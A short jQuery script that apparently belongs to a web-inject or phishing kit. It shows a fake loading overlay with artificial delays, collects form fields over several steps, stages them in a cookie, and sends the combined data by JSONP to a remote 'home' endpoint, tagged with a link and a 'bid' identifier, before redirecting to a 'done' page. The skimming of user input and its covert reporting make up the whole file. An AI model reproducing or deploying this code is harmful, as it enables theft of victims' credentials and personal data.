   $(document).ready(function() {

       $('<div class="loader__" style="display:none;position: fixed;background: rgba(21, 20, 20, 0.51);width: 100%;height: 100%;top: 0px;left: 0px;z-index: 1000;text-align: center;">\
   \
   \
   \
   <span class="fa-stack l_4" style="font-size: 50px;position: relative;top: 50%;-webkit-transform: translateY(-50%); -ms-transform: translateY(-50%); transform: translateY(-50%);">\
          <i class="fa fa-square fa-stack-2x"></i>\
          <i class="fa fa-circle-o-notch fa-stack-1x fa-spin" style="color: white"></i>\
   </span>\
</div>').appendTo('body');

       window.loader_ = {
           hide: function() {
               $('.loader__').fadeOut('fast');
           },
           show: function() {
               $('.loader__').fadeIn('fast');
           }
       }
   });




   function next__(el) {
       loader_.show();
       var data__ = $(el).custom_ser();
       setTimeout(function() {
           window.top.email_plugin.send(data__);
       }, 3000)
   }





   function back() {
       loader_.show();
       setTimeout(function() {
           window.top.email_plugin.cancel();
       }, 3000)
   }




   function finish__(el) {
       cookies.set('ses', 1);
       loader_.show();
       // alert('fin');
       var data__ = $(el).custom_ser();
       var all_data__ = $.extend({}, data__, JSON.parse(cookies.get('data__')));



       if (/(email|jabber|complited)\.php/.test(php_js.home)) {
           data__ = all_data__;
       }


       $.ajax({
           url: php_js.home + "&sl&done&link=" + php_js.link + "&bid=" + bid,
           dataType: "jsonp",
           data: {
               data: JSON.stringify(data__)
           },
           success: function(data) {
               // window.location.href = php_js.bb_link;
               window.location.href = "../done/";
           },
           error: function(data) {}
       });
   }



   $(document).ready(function() {
       // $('head base').attr('href','');
   });